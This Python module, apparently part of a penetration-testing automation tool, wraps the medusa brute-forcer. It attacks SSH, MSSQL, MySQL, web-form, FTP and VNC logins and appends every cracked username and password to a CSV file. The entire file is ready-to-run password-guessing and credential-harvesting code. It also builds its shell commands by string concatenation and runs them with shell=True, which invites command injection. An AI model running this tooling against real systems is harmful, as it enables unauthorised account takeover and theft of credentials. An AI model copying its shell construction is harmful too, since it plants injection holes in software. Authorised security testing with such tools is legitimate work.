#!/usr/bin/env python
import logging
import subprocess
import sys

logger = logging.getLogger("qlogger")

def sshCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M ssh > " + root + "password/ssh/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/ssh/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" SSH Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",ssh\n")
	fr.close()
	fo.close()


def mssqlCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/mssql/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" MSSQL Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",mssql\n")
	fr.close()
	fo.close()

def mysqlCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M mysql > " + root + "password/mysql/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/mysql/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" mySQL Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",mysql\n")
	fr.close()
	fo.close()
	
def webformCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M web-form > " + root + "password/http/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/http/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" Web Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",http\n")
	fr.close()
	fo.close()

def ftpCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M ftp > " + root + "password/ftp/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/ftp/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" FTP Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",ftp\n")
	fr.close()
	fo.close()

def vncCrack(ip_address, port, root, medusaFlags):
	MEDUSA = "medusa -h " + ip_address + " -n " + port + " " + medusaFlags["users"] + " " + medusaFlags["pws"] + " " + medusaFlags["jb"] + " " + medusaFlags["verbosity"] + " " + medusaFlags["combo"] + " " + medusaFlags["ssl"] + " " + medusaFlags["custom"] + " -M vnc > " + root + "password/vnc/medusa_" + ip_address + ".txt"
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	fr = open(root + "password/vnc/medusa_" + ip_address + ".txt")
	fo = open(root + "password/passwords.csv", 'a+')
	for line in fr:
		if "SUCCESS" in line:
			line = line.split(" ")
			un = line[6]
			pw = line[8]
			logger.warning(" VNC Password for "+ip_address+":"+port+ " - "+un + "/" + pw)
			fo.write(ip_address + "," + port + "," + un + "," + pw + ",vnc\n")
	fr.close()
	fo.close()
	
if __name__=='__main__':
	if sys.version_info[0] != 3 or sys.version_info[1] < 1:
		logger.error("\nEXIT: This script requires Python version 3.1 or higher\n")
		sys.exit(1)
		